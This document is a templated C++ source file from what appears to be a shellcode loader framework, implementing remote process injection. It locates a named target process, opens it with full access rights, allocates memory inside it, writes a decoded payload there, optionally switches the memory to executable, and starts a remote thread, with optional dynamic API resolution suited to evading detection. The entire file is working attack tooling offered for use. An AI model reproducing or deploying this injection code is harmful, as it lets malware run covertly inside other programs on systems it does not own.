{% if section == "globals" %}
    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
        {{ function_typedef("OpenProcess") }}
        {{ function_typedef("VirtualAllocEx") }}
        {{ function_typedef("WriteProcessMemory") }}
        {{ function_typedef("VirtualProtectEx") }}
        {{ function_typedef("CreateThread") }}
    {% endif %}

    {% include "lib/find_process.cpp" %}

    void *alloc(void *decoded, SIZE_T length, HANDLE hProc){
        {{ function_definition("VirtualAllocEx") }}
        {{ function_definition("WriteProcessMemory") }}
        {{ function_definition("VirtualProtectEx") }}

        {% if link.alloc.protection == "rx" %}
            LPVOID pRemoteCode = pVirtualAllocEx(
                hProc, NULL, length, MEM_COMMIT, PAGE_READWRITE
            );
            pWriteProcessMemory(
                hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL
            );
            {{ createThreadStub("remote", "pRemoteCode", "pRemoteCode") }}
            DWORD old;
            pVirtualProtectEx(
                hProc, pRemoteCode, length, PAGE_EXECUTE_READ, &old
            );
        {% else %}
            LPVOID pRemoteCode = pVirtualAllocEx(
                hProc, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE
            );
            pWriteProcessMemory(
                hProc, pRemoteCode, (PVOID) decoded, length, (SIZE_T*) NULL
            );
            {{ createThreadStub("remote", "pRemoteCode", "pRemoteCode") }}
        {% endif %}
        return pRemoteCode;
    }
{% else %}
    int pid = FindProcess("{{ link.target_process_name }}");
    if(!pid){
        printf("[-] Failed to discover process\n");
        return 0;
    }

    {{ function_definition("OpenProcess") }}

    HANDLE hProc = pOpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE,
        (DWORD) pid
    );

    void *mem = alloc(raw, length, hProc);
{% endif %}
